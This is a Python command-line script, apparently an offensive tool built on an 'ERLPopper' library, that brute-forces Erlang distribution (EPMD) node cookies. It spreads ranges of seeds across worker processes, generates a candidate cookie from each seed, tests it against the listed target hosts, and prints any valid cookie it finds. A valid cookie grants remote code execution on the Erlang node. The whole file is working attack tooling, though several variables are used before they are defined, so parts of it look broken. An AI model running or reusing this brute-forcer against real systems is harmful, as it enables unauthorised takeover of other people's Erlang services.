#!/usr/bin/env python3
import argparse
import multiprocessing
from sys import stderr
from os import cpu_count
from os.path import isfile
from time import time
from multiprocessing import Pool
from itertools import product
from ERLPopper import *

#   char full_space[] = "0,68719476735,100.0";

def parse_str_or_file(in_str):
    """
    Expecting:
        <string>
        - OR -
        <string_file>
    Where:
        <string> is a single item
        <string_file> is a newline-delimited list of <string>s
    """

    list_lines = []
    if not isfile(in_str):
        list_lines = [in_str]
    else:
        list_lines = [x.strip() for x in open(in_str, "r").readlines()]

    return list_lines

def print_result(res):
    for r in res:
        if r is not None:
            (target, cookie) = res
            print(f"[+] Good cookie ({target}): {cookie}")
    #return res

def split(a, n):
    # From: https://stackoverflow.com/questions/2130016/splitting-a-list-into-n-parts-of-approximately-equal-length
    k, m = divmod(len(a), n)
    return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n))

def go(target, interval, version, verbose):
    (start, end) = interval.split(',')
    interval_time_last = time()
    interval_progress = int(start)
    r = 0
    epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=verbose)
    for i in range(int(start), int(end)):
        if time() - interval_time_last > 2:
            old_r = r
            r = int((i-interval_progress)/2)
            with rate.get_lock():
                rate.value -= old_r
                rate.value += r
            print(f"\tCookies: {rate.value}/s{' '*10}", end='\r')
            interval_progress = i
            interval_time_last = time()
        cookie = ERLPopper.create_cookie_from_seed(i)
        if epop.check_cookie(cookie):
            with rate.get_lock():
                rate.value -= old_r
            return (target, cookie)
    
    with rate.get_lock():
        rate.value -= old_r

if __name__ == "__main__":
    # Parse args
    parser = argparse.ArgumentParser(
            description="Attempt to brute force EPMD node cookie using various methods.",
            epilog="Maximum interval seed space is 0 to 68719476735 according to erl-matter/bruteforce-erldp.c. That's 68.7 billion seeds * 21char = 64 GB if you were trying to store the cookies themselves. The entire [A-Z]{20} set is 26^20 * 21char = 3.98 * 10^29 bytes (39.8 million Exabytes)."
    )

    parser.add_argument("target", action="store", type=parse_str_or_file, help="Target node <address>:<port>, or file containing newline-delimited list of <address>:<port> strings.")
    parser.add_argument("interval", action="store", type=parse_str_or_file, help="Seed interval in format <start>,<end> or file containing newline-delimited list of intervals.")
    version_group = parser.add_mutually_exclusive_group()
    version_group.add_argument("--old", action="store_true", help="Use old handshake method (default).")
    version_group.add_argument("--new", action="store_true", help="Use new handshake method.")
    parser.add_argument("--verbose", action="store_true", help="Extra output for debugging.")
    parser.add_argument("--processes", action="store", type=int, help="Number of processes to use (default: 4).")

    args = parser.parse_args()

    version = 5
    if args.new:
        version = 6

    # Make rate variable available to all processes
    rate = multiprocessing.Value('I')
    
    processes = args.processes
    if not processes:
        processes = cpu_count()

    # Divide single interval among n processes
    if len(args.interval) == 1:
        (start, end) = args.interval[0].split(',')
        intervals = [f"{x.start},{x.stop}" for x in split(range(int(start), int(end)), processes)]
    else:
        intervals = args.interval

    # Create a product of the passed in arguments which will get map()ed as iterables to pool processes
    targets_intervals_product = product(args.target, intervals, [version], [args.verbose])

    print(f"Dividing {len(intervals)} intervals among {processes} processes...")
    with Pool(processes=args.processes) as pool:
        result = pool.starmap_async(func=go, iterable=targets_intervals_product, callback=print_result).get()

    print()
    [print(r) for r in result if r]